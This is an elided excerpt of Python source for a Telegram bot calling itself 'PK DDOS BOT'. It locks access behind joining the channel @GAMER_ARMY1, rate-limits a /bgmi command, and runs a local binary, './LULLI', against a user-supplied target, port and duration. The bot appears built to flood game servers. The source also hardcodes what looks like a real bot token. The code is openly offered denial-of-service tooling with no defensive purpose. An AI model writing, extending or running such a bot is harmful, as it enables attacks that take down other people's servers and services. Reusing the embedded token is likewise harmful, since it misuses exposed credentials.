...
bot = telebot.TeleBot('7727142822:AAFYRWYCdpc6LNSbCbe9cjhxRn819ZSpHQY')
...
def welcome_start(message):
    ...
    if not is_user_in_channel(user_id):
        bot.reply_to(message, "⛔️ 𝗔𝗰𝗰𝗲𝘀𝘀 𝗗𝗲𝗻𝗶𝗲𝗱! 𝗣𝗹𝗲𝗮𝘀𝗲 𝗷𝗼𝗶𝗻 𝗼𝘂𝗿 𝗰𝗵𝗮𝗻𝗻𝗲𝗹 @GAMER_ARMY1 𝘁𝗼 𝘂𝘀𝗲 𝘁𝗵𝗶𝘀 𝗯𝗼𝘁")
    else:
        response = "🔆 𝗪𝗘𝗟𝗖𝗢𝗠𝗘 𝗧𝗢 𝗣𝗞 𝗗𝗗𝗢𝗦 𝗕𝗢𝗧 🔆"
        bot.reply_to(message, response)
...
def handle_attack(message):
    ...
    if user_id in last_attack_time:
        ...
        if elapsed_time < COOLDOWN_TIME:
            ...
            bot.reply_to(message, f"❗️𝗬𝗼𝘂 𝗻𝗲𝗲𝗱 𝘁𝗼 𝘄𝗮𝗶𝘁 {wait_time} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 𝗯𝗲𝗳𝗼𝗿𝗲 𝘂𝘀𝗶𝗻𝗴 𝘁𝗵𝗲 /bgmi 𝗰𝗼𝗺𝗺𝗮𝗻𝗱 𝗮𝗴𝗮𝗶𝗻.")
            return
    ...
    if len(command) == 4:
        ...
        def execute_attack():
            try:
                full_command = f"./LULLI {target} {port} {attack_time}"
